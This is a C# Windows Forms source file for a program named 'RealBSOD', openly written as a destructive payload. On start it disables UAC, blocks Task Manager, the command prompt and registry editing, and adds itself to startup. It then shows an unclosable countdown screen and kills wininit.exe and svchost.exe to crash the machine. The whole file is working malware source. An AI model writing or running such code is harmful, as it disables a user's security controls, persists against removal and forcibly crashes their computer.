using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Win32;

namespace RealBSOD
{
	public class BSODPayload : Form
	{
		private IContainer components = null;

		private Timer tmr_BSOD;

		private Label label1;

		private Label label2;

		private Label label3;

		public BSODPayload()
		{
			InitializeComponent();
		}

		private void BSODPayload_Load(object sender, EventArgs e)
		{
			label3.Text = TimeSpan.FromSeconds(3.0).ToString();
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
			RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			registryKey3.SetValue("RealBSOD", Application.ExecutablePath.ToString());
			RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey4.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
			RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
			registryKey5.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
			RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey6.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
			tmr_BSOD.Start();
		}

		private void tmr_BSOD_Tick(object sender, EventArgs e)
		{
			MessageBox.Show("Time is up! BSOD time", "Time is up!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "taskkill.exe";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.Arguments = " /f /im wininit.exe";
			Process.Start(processStartInfo);
			tmr_BSOD.Stop();
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = "taskkill.exe";
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo2.Arguments = " /f /im svchost.exe";
			Process.Start(processStartInfo2);
		}

		private void BSODPayload_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			this.tmr_BSOD = new System.Windows.Forms.Timer(this.components);
			this.label1 = new System.Windows.Forms.Label();
			this.label2 = new System.Windows.Forms.Label();
			this.label3 = new System.Windows.Forms.Label();
			base.SuspendLayout();
			this.tmr_BSOD.Tick += new System.EventHandler(tmr_BSOD_Tick);
			this.label1.AutoSize = true;
			this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 24f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.label1.Location = new System.Drawing.Point(27, 26);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(470, 37);
			this.label1.TabIndex = 0;
			this.label1.Text = "Your PC is now going to bsod";
			this.label2.AutoSize = true;
			this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 26.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.label2.Location = new System.Drawing.Point(223, 95);
			this.label2.Name = "label2";
			this.label2.Size = new System.Drawing.Size(47, 39);
			this.label2.TabIndex = 1;
			this.label2.Text = "In";
			this.label3.AutoSize = true;
			this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 72f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.label3.Location = new System.Drawing.Point(203, 210);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(99, 108);
			this.label3.TabIndex = 2;
			this.label3.Text = "0";
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.Red;
			base.ClientSize = new System.Drawing.Size(527, 437);
			base.Controls.Add(this.label3);
			base.Controls.Add(this.label2);
			base.Controls.Add(this.label1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "BSODPayload";
			base.ShowInTaskbar = false;
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "BSODPayload";
			base.TopMost = true;
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(BSODPayload_FormClosing);
			base.Load += new System.EventHandler(BSODPayload_Load);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
